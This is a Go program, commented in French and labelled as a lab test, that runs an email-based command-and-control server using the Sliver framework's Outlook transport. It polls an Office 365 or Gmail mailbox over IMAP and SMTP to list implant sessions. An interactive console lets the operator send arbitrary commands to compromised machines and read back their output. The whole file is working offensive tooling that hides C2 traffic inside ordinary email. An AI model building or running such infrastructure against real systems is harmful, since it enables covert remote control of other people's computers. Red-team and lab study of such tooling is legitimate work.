package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports/outlook"
	outlookc2 "github.com/bishopfox/sliver/server/c2/outlook"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// ===== CONFIGURATION =====
	// À PERSONNALISER AVEC TES VALEURS !

	// Lire la clé depuis le fichier
	encKeyHex := "COLLER_ICI_LA_CLE_DE_/tmp/outlook-key.txt"
	encKey, err := outlook.HexToKey(encKeyHex)
	if err != nil {
		log.Fatalf("Invalid encryption key: %v", err)
	}

	// Configuration serveur
	config := &outlookc2.ServerConfig{
		// === SMTP Configuration ===
		SMTPHost:     "smtp.office365.com",      // ou smtp.gmail.com
		SMTPPort:     587,
		SMTPUsername: "ton-email@domaine.com",   // TON EMAIL
		SMTPPassword: "ton-mot-de-passe",        // TON MOT DE PASSE
		SMTPUseTLS:   true,

		// === IMAP Configuration ===
		IMAPHost:     "outlook.office365.com",   // ou imap.gmail.com
		IMAPPort:     993,
		IMAPUsername: "ton-email@domaine.com",   // MÊME EMAIL
		IMAPPassword: "ton-mot-de-passe",        // MÊME MOT DE PASSE
		IMAPUseTLS:   true,
		IMAPFolder:   "INBOX",

		// === C2 Configuration ===
		C2Email:       "ton-email@domaine.com",  // MÊME EMAIL
		EncryptionKey: encKey,
		PollInterval:  10 * time.Second,         // 10s pour le lab
		MarkAsRead:    true,
		DeleteAfter:   false,                    // false pour voir les emails
		Debug:         true,
	}

	// Afficher la config (sans les mots de passe)
	log.Println("╔════════════════════════════════════════════════════╗")
	log.Println("║      OUTLOOK C2 SERVER - LAB TEST MODE            ║")
	log.Println("╚════════════════════════════════════════════════════╝")
	log.Printf("C2 Email:         %s", config.C2Email)
	log.Printf("SMTP Server:      %s:%d", config.SMTPHost, config.SMTPPort)
	log.Printf("IMAP Server:      %s:%d", config.IMAPHost, config.IMAPPort)
	log.Printf("Encryption Key:   %s...", encKeyHex[:32])
	log.Printf("Poll Interval:    %v", config.PollInterval)
	log.Printf("Delete After:     %v", config.DeleteAfter)
	log.Println("════════════════════════════════════════════════════")

	// Valider la config
	if err := config.Validate(); err != nil {
		log.Fatalf("❌ Invalid config: %v", err)
	}

	// Créer le handler
	handler, err := outlookc2.NewOutlookC2Handler(config)
	if err != nil {
		log.Fatalf("❌ Failed to create handler: %v", err)
	}

	// Démarrer le handler
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	log.Println("🚀 Starting C2 server...")
	if err := handler.Start(ctx); err != nil {
		log.Fatalf("❌ Failed to start handler: %v", err)
	}

	log.Println("✅ Outlook C2 Server STARTED")
	log.Println("📬 Waiting for implants...")
	log.Println("📊 Status updates every 30 seconds")
	log.Println("🛑 Press Ctrl+C to stop")
	log.Println()

	// Console interactive pour envoyer des commandes
	go func() {
		reader := bufio.NewReader(os.Stdin)
		log.Println("💬 Interactive mode ready. Type 'help' for commands.")

		for {
			fmt.Print("\nc2> ")
			input, _ := reader.ReadString('\n')
			input = strings.TrimSpace(input)

			if input == "" {
				continue
			}

			parts := strings.SplitN(input, " ", 3)
			cmd := parts[0]

			switch cmd {
			case "help":
				fmt.Println("Commands:")
				fmt.Println("  sessions              - List active sessions")
				fmt.Println("  send <sessionID> <cmd> - Send command to session")
				fmt.Println("  results <sessionID>   - Show completed tasks")
				fmt.Println("  help                  - Show this help")
				fmt.Println("  quit                  - Stop server")

			case "sessions":
				sessions := handler.ListSessions()
				if len(sessions) == 0 {
					fmt.Println("No active sessions")
				} else {
					fmt.Printf("Active sessions: %d\n", len(sessions))
					for _, s := range sessions {
						fmt.Printf("  - Session: %s\n", s.SessionID[:8])
						fmt.Printf("    Email: %s\n", s.ImplantEmail)
						fmt.Printf("    Last seen: %v ago\n", time.Since(s.LastSeen).Round(time.Second))
						fmt.Printf("    Pending: %d, Completed: %d\n",
							len(s.GetPendingTasks()),
							len(s.GetCompletedTasks()))
					}
				}

			case "send":
				if len(parts) < 3 {
					fmt.Println("Usage: send <sessionID> <command>")
					continue
				}
				sessionID := parts[1]
				command := parts[2]

				// Trouver la session pour avoir l'email
				session := handler.GetSession(sessionID)
				if session == nil {
					fmt.Printf("Session not found: %s\n", sessionID)
					continue
				}

				fmt.Printf("Sending command '%s' to session %s...\n", command, sessionID[:8])
				taskID, err := handler.SendCommand(sessionID, session.ImplantEmail, command)
				if err != nil {
					fmt.Printf("❌ Error: %v\n", err)
					continue
				}

				fmt.Printf("✅ Command sent, Task ID: %s\n", taskID[:8])
				fmt.Println("Waiting for result (timeout 2 min)...")

				result, err := handler.WaitForTaskResult(sessionID, taskID, 2*time.Minute)
				if err != nil {
					fmt.Printf("❌ Timeout or error: %v\n", err)
					continue
				}

				fmt.Printf("✅ Result received:\n")
				fmt.Printf("────────────────────────────────\n")
				fmt.Println(result.Result)
				fmt.Printf("────────────────────────────────\n")

			case "results":
				if len(parts) < 2 {
					fmt.Println("Usage: results <sessionID>")
					continue
				}
				sessionID := parts[1]
				session := handler.GetSession(sessionID)
				if session == nil {
					fmt.Printf("Session not found: %s\n", sessionID)
					continue
				}

				results := session.GetCompletedTasks()
				if len(results) == 0 {
					fmt.Println("No completed tasks")
				} else {
					fmt.Printf("Completed tasks: %d\n", len(results))
					for _, r := range results {
						fmt.Printf("  Task %s: %s\n", r.TaskID[:8], r.Result[:50])
					}
				}

			case "quit":
				fmt.Println("Shutting down...")
				handler.Stop()
				os.Exit(0)

			default:
				fmt.Printf("Unknown command: %s (type 'help' for commands)\n", cmd)
			}
		}
	}()

	// Monitoring périodique
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			sessions := handler.ListSessions()
			log.Printf("📊 Status: %d active session(s)", len(sessions))
			for _, s := range sessions {
				log.Printf("   └─ %s (email: %s, last: %v ago)",
					s.SessionID[:8],
					s.ImplantEmail,
					time.Since(s.LastSeen).Round(time.Second))
			}
		}
	}()

	// Attendre interruption
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	<-sigChan

	log.Println("\n🛑 Shutting down...")
	handler.Stop()

	// Stats finales
	sessions := handler.ListSessions()
	log.Printf("📊 Final stats: %d total session(s)", len(sessions))
	log.Println("✅ Server stopped")
}
